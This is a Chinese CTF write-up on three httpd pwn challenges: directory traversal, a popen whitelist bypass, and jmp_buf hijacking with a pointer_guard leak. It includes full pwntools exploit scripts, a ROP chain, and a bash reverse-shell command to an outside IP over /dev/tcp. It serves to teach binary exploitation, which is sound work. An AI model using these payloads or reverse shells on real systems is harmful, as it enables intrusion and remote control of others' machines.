目录穿越
====

- 此题是NKCTF2024 httpd这道题

题目分析
----

1. %\[^ \] 是C语言中 scanf 和 sscanf 函数用于格式化输入的格式化字符串中的一个格式说明符。具体地，%\[^ \] 表示要读取的输入字符序列直到遇到第一个空格字符（空格字符之前的字符），然后将其存储到对应的变量中。其中 ^ 符号表示取反，\[^ \] 表示除了空格之外的所有字符。这样的格式化说明符通常用于读取字符串中的单词或特定字符之间的内容。

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-32bd70cd2207a8b3551cb9e896ff58b6d04d359c.png)

2. **这里最主要的漏洞是v7是char型，那么strlen后超过255后会有溢出漏洞，那么就可以由此进行目录穿越**

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-fe232ee351f1bf7740c3b249d262f512c88650e6.png)

3. 利用scandir函数进行目录扫描,通过扫描../目录得到../flag.txt目录进行输出

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-c9934efacfa4cb19b23396a94a6c2776077da970.png)

4. 区分sscanf函数与scanf函数 
    - scanf 函数：  
        scanf 函数从标准输入流（通常是键盘）读取输入，可以使用格式化字符串来指定期望输入的格式。  
        它通常用于从用户键盘输入的交互式输入中读取数据。  
        例如：scanf("%d %f", &amp;intVar, &amp;floatVar); 会尝试从标准输入中读取一个整数和一个浮点数。
    - sscanf 函数：  
        sscanf 函数用于从一个字符串中按照指定的格式解析数据，与 scanf 不同，它不是直接从标准输入流中读取数据，而是从给定的字符串中读取数据。它通常用于解析字符串中的特定格式的数据。  
        例如：sscanf(str, "%d %f", &amp;intVar, &amp;floatVar); 会尝试从字符串 str 中读取一个整数和一个浮点数。
5. 最后就是要慢慢逆向出逻辑就好了

exp
---

```python
from pwn import *
import sys
LOCAL = len(sys.argv) == 1
if LOCAL:
    p = process('./httpd')
else:
    p = remote(sys.argv[1], int(sys.argv[2]))

p.send(b'GET /.' + b'/' * 256 + b'.. HTTP/1.0\r\n')
p.send(b'host: 0.0.0.10\r\n')
p.send(b'Content-length: 0\r\n')

p.recvuntil(b'./flag.txt:')
data = p.recvline(keepends=False)

from Crypto.Cipher import ARC4
print(ARC4.new(b'reverse').decrypt(data))

# p.interactive()
p.close()

# NKCTF{35c16fb6-2a41-4b83-b04c-c939281bea4c}
```

基于popen函数的攻击
============

- 2024羊城杯vhttpd  
    题目没有给libc,保护全开，还是32位，看到这些基本就没有想栈溢出方面的事情了

可以发现这个与以往的web pwn有一些不同，这里有个之前没见过的过滤函数，但绕过这个过滤很简单

```c
_BOOL4 __cdecl whitelist(const char *a1)
{
  _BOOL4 result; // eax
  char needle[3]; // [esp+15h] [ebp-13h] BYREF
  char v3[4]; // [esp+18h] [ebp-10h] BYREF
  unsigned int v4; // [esp+1Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  strcpy(needle, "sh");
  strcpy(v3, "bin");
  if ( strchr(a1, '&') )
  {
    result = 0;
  }
  else if ( strchr(a1, '|') )
  {
    result = 0;
  }
  else if ( strchr(a1, ';') )
  {
    result = 0;
  }
  else if ( strchr(a1, '$') )
  {
    result = 0;
  }
  else if ( strchr(a1, '{') )
  {
    result = 0;
  }
  else if ( strchr(a1, '}') )
  {
    result = 0;
  }
  else if ( strchr(a1, '`') )
  {
    result = 0;
  }
  else if ( strstr(a1, needle) )
  {
    result = 0;
  }
  else
  {
    result = strstr(a1, v3) == 0;
  }
  if ( v4 != __readgsdword(0x14u) )
    stack_fail_error();
  return result;
}
```

然后看看有没有目录穿越，发现是做不到的，注意到这里有一段代码,最关键的就是这个popen函数

popen 函数用于创建一个管道，通过该管道可以让一个进程执行 shell 命令并与该命令进行输入或输出通信。

```c
/*
FILE *freopen(const char *filename, const char *mode, FILE *stream);
freopen 函数用于重定向一个已经打开的文件流。它可以将一个文件流（例如 stdin、stdout 或 stderr）重定向到一个指定的文件。

int dup(int oldfd);
返回值: 成功时，返回新的文件描述符（一个非负整数）；失败时，返回 -1，并设置 errno 以指示错误。

int dup2(int oldfd, int newfd);
dup2 函数的具体作用是将一个现有的文件描述符(newfd)复制到另一个指定的文件描述符(oldfd)上。这个操作使得两个文件描述符指向同一个文件或资源，拥有相同的文件偏移量和访问模式。
*/
  v3 = fileno(stdout);
  new_stdout = dup(v3);
  v4 = fileno(stderr);
  new_stderr = dup(v4);
  freopen("/dev/null", "w", stdout);
  freopen("/dev/null", "w", stderr);
  stream = popen("sh >/dev/null", modes);
  if ( stream )
  {
    pclose(stream);
    v6 = fileno(stdout);
    dup2(new_stdout, v6);
    v7 = fileno(stderr);
    dup2(new_stderr, v7);
    close(new_stdout);
    close(new_stderr);
/* 
 ...
*/

}
```

- 由此思路就明确了，直接用这个popen函数执行sh，然后反弹shell即可
- exp

```python
from pwnlib.util.packing import u64
from pwnlib.util.packing import u32
from pwnlib.util.packing import u16
from pwnlib.util.packing import u8
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
from pwnlib.util.packing import p16
from pwnlib.util.packing import p8
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
p = process("/home/zp9080/PWN/httpd")
# p=remote('139.155.126.78',31700)
# p=process(['seccomp-tools','dump','/home/zp9080/PWN/pwn'])
elf = ELF("/home/zp9080/PWN/httpd")
libc=elf.libc
def dbg():
    gdb.attach(p,"b *$rebase(0x1BEE)")  
    pause()

host = '0.0.0.10'
request = 'GET /"s"h HTTP/1.0\r\n'
request += 'Host: ' + host + '\r\n'
request += 'Content-Length: 0\r\n'

p.sendline(request)

p.sendline('bash -c "bash -i >& /dev/tcp/172.18.211.41/7777 0>&1"')
p.interactive()

```

基于jmp\_buf结构体的攻击
================

前置知识
----

### jmp\_buf结构体

setjmp.h 头文件定义了宏 setjmp()、函数 longjmp() 和变量类型 jmp\_buf，该变量类型会绕过正常的函数调用和返回规则

jmp\_buf 是一个数据类型，用于保存调用环境，包括栈指针、指令指针和寄存器等。在执行 setjmp() 时，这些环境信息会被保存到 jmp\_buf 类型的变量中。

int setjmp(jmp\_buf environment)  
这个宏把当前环境保存在变量 environment 中，以便函数 longjmp() 后续使用。如果这个宏直接从宏调用中返回，则它会返回零，但是如果它从 longjmp() 函数调用中返回，则它会返回一个非零值。

void longjmp(jmp\_buf environment, int value)  
该函数恢复最近一次调用 setjmp() 宏时保存的环境，jmp\_buf 参数的设置是由之前调用 setjmp() 生成的。

**根据上述内容，如果jmp\_buf结构体存储在栈上，并且我们可以栈溢出覆盖到此处，那么将可以控制程序的流程!!!**

### pointer\_guard

- 结构体的类型为struct pthread，我们称其为一个thread descriptor，该结构体的第一个域为tchhead\_t类型，其定义如下：
    
    ```C
    typedef struct
    {
    void *tcb;        /* Pointer to the TCB.  Not necessarily the
               thread descriptor used by libpthread.  */
    dtv_t *dtv;
    void *self;       /* Pointer to the thread descriptor.  */
    int multiple_threads;
    int gscope_flag;
    uintptr_t sysinfo;
    uintptr_t stack_guard; 0x28
    uintptr_t pointer_guard; 0x30
    unsigned long int vgetcpu_cache[2];
    /* Bit 0: X86_FEATURE_1_IBT.
     Bit 1: X86_FEATURE_1_SHSTK.
    */
    unsigned int feature_1;
    int __glibc_unused1;
    /* Reservation of some values for the TM ABI.  */
    void *__private_tm[4];
    /* GCC split stack support.  */
    void *__private_ss;
    /* The lowest address of shadow stack,  */
    unsigned long long int ssp_base;
    /* Must be kept even if it is no longer used by glibc since programs,
     like AddressSanitizer, depend on the size of tcbhead_t.  */
    __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32)));
    
    void *__padding[8];
    } tcbhead_t;
    ```

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-41afe4ec226a368729fae2d3a2f1d98a17c1a7e1.png)

- 可以看到这两个宏利用pointer\_guard分别对指针进行了加密和解密操作，加密由一次异或以及一次bitwise rotate组成。加密使用的key来自fs:\[offsetof(tcbhead\_t, pointer\_guard)\]， 利用pointer\_guard进行加密的过程可以表示为rol(ptr ^ pointer\_guard, 0x11, 64)，解密的过程为ror(enc, 0x11, 64) ^ pointer\_guard
- 因此我们写入数据的时候用这个加密方式就可以了  
    eg: ```python
    #bin会给数字转化为2进制，但是会带上0b，因此要取[2:]
    def ROL(content, key):
    tmp = bin(content)[2:].rjust(64, '0')
    return int(tmp[key:] + tmp[:key], 2)
    ROL(gadget_addr ^ pointer_guard, 0x11)
    ```

**这里以DASCTF2024暑期挑战赛 vhttp为例,讲解这个漏洞的利用过程（此题是libc2.31，实操发现如果是libc2.35打不通）**

逆向分析
----

- main中一般都是先处理http包,常见格式如下

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-a09a9842c4ff715445b0881743434efe3cdc87f9.png)

```python
payload = b"GET /index.html HTTP/1.1\r\n"
payload+= b"content-length:2848\r\n"
```

- 逆向出的结构体 ```C
    
    ```

struct http\_header  
{  
char  *method;  
char*  path;  
char  *version;  
int header\_count;  
struct Header*  headers;  
char \* data;  
int content\_length;  
jmp\_buf err;  
};

```php
* 处理完http包后一般看haystack是否包含flag相关字符串然后进行不同的函数处理 
* func1,处理路径得到绝对路径，并输出http包相关内容

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-dd348a44e9c1022a4f6178e0741a448b9ed10bc6.png)

* func2,打开文件，如果直接是一个文件那么就输出文件内容，如果是一个文件夹那么就遍历输出文件夹中有哪些文件 

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-bb81a974b4f5ed25c87d89dfafd8ed515f5c4aa6.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-873ecf0afade8992a73b2294a202112fafcb9291.png)

## 漏洞分析
* 先记录一下httpd常见漏洞形式
1. 第一种，最简单的就是haystack中有flag.txt但是可以进行目录穿越类似的漏洞
2. 第二种，进入func2，但是遍历目录的时候有漏洞可以读出flag
3. 第三种，也就是本题见到的这种，针对jmp_buf结构体的漏洞

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-58df9ed5980e7c648c1cd9737e5252f92d3ccc0a.png)
* 具体漏洞如下

content_length由http header中的content-length确定
```C
// sub_401ce7  
for ( i = 0; i <= 1; ++i )
  {
    fread(s, *(int *)(a1 + 48), 1uLL, stdin);
    if ( strncmp(s, "\r\nuser=newbew", 0xCuLL) )
      break;
    write(1, "HTTP/1.1 403 Forbidden\r\n", 0x18uLL);
    write(1, "Content-Type: text/html\r\n", 0x19uLL);
    write(1, "\r\n", 2uLL);
    write(1, "<h1>Forbidden</h1>", 0x12uLL);
    v1 = strlen(s);
    write(1, s, v1);
  }
```

这里的fread的length就是之前得到的content\_length，这是我们可以控制的，因此这里存在一个栈溢出

但是由于退出此函数都是exit，无法直接ROP

这里的考点在于setjmp函数，其通过一个jmp\_buf结构体保存寄存器的值，longjmp通过恢复这些寄存器的值进行跳转

因此，如果我们覆盖了jmp\_buf结构体，就可以劫持程序控制流程

但是jmp\_buf中栈寄存器和rip都被TCB中的pointer\_guard保护。但注意到，这个溢出发生在线程中，线程的栈靠近线程TCB，由于程序运行时其他函数需要用到pointer guard， 因此不能直接覆盖，需要leak

因此，我们可以利用下述函数带出pointer guard

```C
// sub_401ce7  
    v1 = strlen(s);
    write(1, s, v1);
```

然后，覆盖jmp buf中的rip和栈指针可以栈迁移进行ROP

exp的编写
------

- 注意到main中的read是读到bss段上，因此也可以在这里布置rop链，进行orw

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-2ba9924a76acf0efef2e0be3fd2b29b9e579bad3.png)

- 当前jmp\_buf+2848偏移处刚好是pointer\_guard，可以泄露出pointer\_guard
- 题目中for ( i = 0; i &lt;= 1; ++i )刚好有两次机会，一次泄露，一次orw
- exp

```python
## ROP Chain
from pwnlib.util.packing import u64
from pwnlib.util.packing import u32
from pwnlib.util.packing import u16
from pwnlib.util.packing import u8
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
from pwnlib.util.packing import p16
from pwnlib.util.packing import p8
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
# p = process("/home/zp9080/PWN/pwn")
# p=gdb.debug("/home/zp9080/PWN/pwn","b *0x401705")
p=remote('node5.buuoj.cn',28360)
# p=process(['seccomp-tools','dump','/home/zp9080/PWN/pwn'])
elf = ELF("/home/zp9080/PWN/pwn")
libc=elf.libc
gdb_script = '''
b pthread_create
c
finish
thread 2
b *0x401EC2
c
b __pthread_cleanup_upto
c
'''

def dbg():
    gdb.attach(p,gdb_script)  
    pause()

def circular_left_shift(value, shift):
    # 确保value是一个64位整数
    value &= 0xFFFFFFFFFFFFFFFF
    # 执行循环左移操作
    shifted_value = ((value << shift) & 0xFFFFFFFFFFFFFFFF) | (value >> (64 - shift))
    return shifted_value

def ptr_g(value, pg):
    val = value ^ pg
    return circular_left_shift(val, 0x11)

# dbg()
ret_addr = 0x000000000040101a
pop_rdi = 0x00000000004028f3
pop_rsi_r15 = 0x00000000004028f1
pop_rdx = 0x000000000040157d
buffer = 0x0405140
open_plt = 0x4013C0
read_plt = 0x401300
write_plt = 0x4012A0
flag_addr = 0x40338A

header = b"GET / HTTP/1.1\r\n"
header+= b"content-length:2848\r\n"

#ORW
rop_payload = b"a"*(0x20-1)+b":"
rop_payload+= p64(ret_addr)*0x4
rop_payload+= p64(pop_rdi)
rop_payload+= p64(flag_addr)
rop_payload+= p64(pop_rsi_r15)
rop_payload+= p64(0x0)
rop_payload+= p64(0x0)
rop_payload+= p64(open_plt)
rop_payload+= p64(pop_rdi)
rop_payload+= p64(0x3)
rop_payload+= p64(pop_rsi_r15)
rop_payload+= p64(buffer+0x100)
rop_payload+= p64(0x0)
rop_payload+= p64(pop_rdx)
rop_payload+= p64(0x200)
rop_payload+= p64(read_plt)
rop_payload+= p64(pop_rdi)
rop_payload+= p64(0x1)
rop_payload+= p64(pop_rsi_r15)
rop_payload+= p64(buffer+0x100)
rop_payload+= p64(0x0)
rop_payload+= p64(write_plt)
rop_payload+= rop_payload.ljust(0x100, b"a")
header+= rop_payload+b'\r\n'

p.send(header)
p.send('\n')

#这里要注意题目要求的是strncmp(s, "\r\nuser=newbew", 0xCuLL)
payload = b'\r\n'+b"user=newbew"+cyclic(2848-13-7)+b'success'
p.send(payload)
p.recvuntil(b"success")
pointer_guard = u64(p.recv(8))
print("Pointer guard:",hex(pointer_guard))

payload = b"&pass=v3rdant".ljust(0x200, b'a')

regs = flat({
    0x8:ptr_g(buffer+0x28, pointer_guard),  #rbp
    #rsp刚好指向rop_payload的地方
    0x30:ptr_g(buffer+0x28, pointer_guard), #rsp
    0x38:ptr_g(ret_addr, pointer_guard),    #rdx的值，jmp rdx
    }
)

payload += regs

payload = payload.ljust(2848-0x20, b'a') #保证fs:[0x10]的值是一个可写的地址即可
payload+= p64(buffer+0x400)*4
print(len(payload))

p.send(payload)

p.interactive()

```

解题遇到的问题及解决
----------

### 多线程如何dbg

- main中有如下代码,创建了另一个线程

```c
 if ( strstr(haystack, "flag.txt") )
      start_routine = (void *(*)(void *))func1;
    else
      start_routine = (void *(*)(void *))func2;
    pthread_create(&newthread, 0LL, start_routine, &method);
    pthread_join(newthread, 0LL);
    status = 0;
```

- 可以用如下方式进行多线程dbg

```text
finish GDB会让程序继续运行，直到当前函数执行完毕并返回到调用它的地方
info threads 显示当前程序中的所有线程，并标注当前所在的线程
thread (id) 这个命令不仅可以用来切换线程，也可以显示当前线程的ID

gdb_script = '''
b pthread_create
c
finish
thread 2
b *0x401EC2
c
b __pthread_cleanup_upto
c
'''
```

### 如何设置jmp\_buf结构体的值进而控制寄存器

- 此时的rdi正好指向jmp\_buf结构体，r8=\[jmp\_buf+0x30\],r9=\[jmp\_buf+0x8\],rdx=\[jmp\_buf+0x38\]。最后又有mov rsp,r8;mov rbp,r9;jmp rdx。
- 有上述过程就可以控制流程了，让rsp=rop\_addr，然后rdx=ret指令，即可实现rop

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-dfb6c5a4f4a3c221f2acc0b8d8f60cb5d5c738f1.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-5ed426642825be90265eef1ed9080787e60d952a.png)

### 又一个问题，发生了段错误

- payload如下会有这个段错误

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-3fc50869ad547f2a177dd567f3085ffcaa1d8999.png)

发现是rax的值被我们覆盖为a了，跟进流程查看如何正确地写payload

```python
payload = b"&pass=v3rdant".ljust(0x200, b'a')

regs = flat({
    0x8:ptr_g(buffer+0x28, pointer_guard),  #rbp
    #rsp刚好指向rop_payload的地方
    0x30:ptr_g(buffer+0x28, pointer_guard), #rsp
    0x38:ptr_g(ret_addr, pointer_guard),    #rdx的值，jmp rdx
    }
)

payload += regs

payload = payload.ljust(2848, b'a')
# payload+= p64(0x405360)*4
print(len(payload))

p.send(payload)
```

- 跟进发现会进入\_longjmp\_unwind,然后进入\_pthread\_cleanup\_upto，此时会有个一个mov rax,qword ptr fs:\[0x10\]，后面又有一个mov r12,qword ptr \[rax+0x698\]就会导致段错误

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-1a044d604a061bf8e3323316de104e99124a3e4d.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-77e28d6209fe33233fb3c3d832770b06e393387f.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-65884b78f97d507f2ea92ec08b838ce895708d31.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-34b361d7d6447b4f5ff9241f6a6d060f334255b4.png)

- 由此就可以想到是我们泄露pointer\_guard时，覆盖了其为a，所以导致赋值不正确，如图也可以看到确实被覆盖了（0x7ffff7da2e10是jmp\_buf的地址）

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-cf2e3c90839ac9d0999e2459a6b868b1b4d7141a.png)

- 做出以下修改即可,保证fs:\[0x10\]的值是一个可写的地址

```python
payload = b"&pass=v3rdant".ljust(0x200, b'a')

regs = flat({
    0x8:ptr_g(buffer+0x28, pointer_guard),  #rbp
    #rsp刚好指向rop_payload的地方
    0x30:ptr_g(buffer+0x28, pointer_guard), #rsp
    0x38:ptr_g(ret_addr, pointer_guard),    #rdx的值，jmp rdx
    }
)

payload += regs

payload = payload.ljust(2848-0x20, b'a') #保证fs:[0x10]的值是一个可写的地址即可
payload+= p64(buffer+0x400)*4
print(len(payload))

p.send(payload)
```

- 至此就打通了

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/11/attach-fb912bc87fc0bf8e6969da869e6a476a428ff3af.png)

一些感想
----

基于jmp\_buf结构体的攻击，打这个的感受就和打堆溢出的house系列的wide\_data结构体一样

就是针对某个结构体，以及其相关函数的漏洞进行攻击，关键点在于要发现一开始那个栈溢出，这样才会想到是否能够劫持jmp\_buf结构体然后进一步劫持流程

这种通过劫持结构体，进而控制程序流程在二进制漏洞里面还是不少的，自己在复现qemu相关的题目也是遇到过相同的手法